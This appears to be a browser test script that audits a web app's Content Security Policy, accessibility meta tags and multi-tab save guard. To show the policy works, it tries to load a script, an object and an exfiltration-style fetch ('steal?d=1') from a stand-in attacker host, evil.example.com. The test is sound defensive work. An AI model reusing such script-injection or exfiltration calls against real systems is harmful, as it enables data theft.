/* CODIS-AUDIT-V38 test (patch_v38.py) — evaluate in the page. Run WITH the violation recorder installed before the app boots:
   PRELOAD='window.__cspv=[];document.addEventListener("securitypolicyviolation",e=>window.__cspv.push(e.violatedDirective+" "+(e.blockedURI||"")+" @"+(e.sourceFile||"").slice(-40)+":"+e.lineNumber))'
   TEST=tests/audit_v38_browser.js node tools/prof/cdp.mjs http://127.0.0.1:8766/app/CODIS_FINAL.html tools/prof/s_evaltest.mjs --cpu 1
   Covers: CSP present + correct, NO violations during boot and the main flows, CSP really blocks foreign script/fetch/object, zoom allowed, dead code gone. */
(async function(){ try{
  const out = [], T = (n, ok, i)=>out.push({ name:n, ok:!!ok, info:i === undefined ? '' : i }), sleep = ms=>new Promise(r=>setTimeout(r, ms));
  const rec = Array.isArray(window.__cspv); T('violation recorder installed before boot (PRELOAD)', rec);
  const meta = document.querySelector('meta[http-equiv="Content-Security-Policy"]'), csp = meta ? meta.content : '';
  T('CSP meta present', !!meta);
  ["object-src 'none'", "base-uri 'self'", 'connect-src', 'https://*.supabase.co', "default-src 'self'"].forEach(d=>T('CSP has ' + d, csp.indexOf(d) > -1));
  T('referrer policy strict-origin-when-cross-origin', (document.querySelector('meta[name="referrer"]') || {}).content === 'strict-origin-when-cross-origin');
  const vp = document.querySelector('meta[name="viewport"]').content;
  T('viewport allows zoom (WCAG 1.4.4)', !/user-scalable\s*=\s*no|maximum-scale\s*=\s*1(\.0)?\b/.test(vp), vp);
  T('dead code removed (errMsg)', typeof window.errMsg === 'undefined');
  /* drive the main flows */
  codisConfirm = async()=>true;
  for(const p of ['planning', 'tasks', 'learn', 'habits', 'settings']){ document.querySelector('.navbtn[data-page="' + p + '"]').click(); await sleep(600); }
  econOpenStore(); await sleep(1200);
  const fl = document.querySelector('#eco-store-body .cflip'); if(fl){ codisFlipToggle(fl); await sleep(700); codisFlipToggle(fl); await sleep(500); }
  CodisUseCine.play({ uid:'csp1', name:'فلم وبيتزا', paid:9000 }); await sleep(2500); CodisUseCine.dismiss(); await sleep(400);
  try{ CodisTheme.set('dark', true); await sleep(300); CodisTheme.set('paper', true); await sleep(300); }catch(e){}
  try{ codisSfx('use.stamp', { lv:5 }); }catch(e){}
  const v0 = rec ? window.__cspv.slice() : ['no recorder'];
  T('NO CSP violations during boot + rooms + store + card flip + use scene + theme switch', v0.length === 0, v0.slice(0, 6));
  /* the policy really blocks what it should */
  const before = window.__cspv.length;
  const sc = document.createElement('script'); sc.src = 'https://evil.example.com/x.js'; let loaded = false; sc.onload = ()=>{ loaded = true; }; document.head.appendChild(sc); await sleep(600); sc.remove();
  T('foreign <script src> blocked', !loaded && window.__cspv.slice(before).some(v=>/script-src/.test(v)), window.__cspv.slice(before));
  let fetched = false; try{ await fetch('https://evil.example.com/steal?d=1', { mode:'no-cors' }); fetched = true; }catch(e){}
  T('exfiltration fetch to a foreign host blocked (connect-src)', !fetched);
  const ob = document.createElement('object'); ob.data = 'https://evil.example.com/x.swf'; document.body.appendChild(ob); await sleep(300); ob.remove();
  T('<object> blocked (object-src none)', window.__cspv.slice(before).some(v=>/object-src/.test(v)));
  T('Supabase host still allowed by connect-src', /connect-src[^;]*https:\/\/\*\.supabase\.co/.test(csp));
  /* multi-tab guard (LAST: it locks this page on purpose). A real two-tab run showed tab B wiping tab A's +100 before v38 */
  T('single tab: guard idle, saves work', typeof CodisTabGuard === 'object' && !CodisTabGuard.isStale() && CodisWallet.adjust(1, 'v38 pre').ok === true);
  const stored0 = localStorage.getItem(STORE_KEY);
  window.dispatchEvent(new StorageEvent('storage', { key:STORE_KEY, newValue:stored0, oldValue:stored0, storageArea:localStorage }));
  await sleep(100);
  T('another tab wrote → this tab is stale', CodisTabGuard.isStale());
  const r2 = CodisWallet.adjust(5, 'v38 stale write');
  T('stale tab cannot overwrite (save refused, rolled back)', r2.ok === false && localStorage.getItem(STORE_KEY) === stored0 && !data.wallet.transactions.some(t=>t.reason === 'v38 stale write'));
  T('stale tab stops syncing (CODIS_SYNC_HOLD)', window.CODIS_SYNC_HOLD === true);
  T('visible stale tab shows the reload notice (named dialog + button)', (()=>{ const d = document.querySelector('.codis-stale[role="alertdialog"]'); return !!d && !!d.querySelector('button.btn') && !!document.getElementById(d.getAttribute('aria-labelledby')); })());
  window.dispatchEvent(new StorageEvent('storage', { key:'codis_theme_v1', newValue:'paper', storageArea:localStorage }));
  T('unrelated keys never trigger the guard twice', document.querySelectorAll('.codis-stale').length === 1);
  const failed = out.filter(x=>!x.ok);
  return { passed:out.length - failed.length, failed:failed.length, failures:failed, results:out };
}catch(e){ return { passed:0, failed:1, failures:[{ name:'EXCEPTION', info:String(e && e.stack || e) }] }; } })();
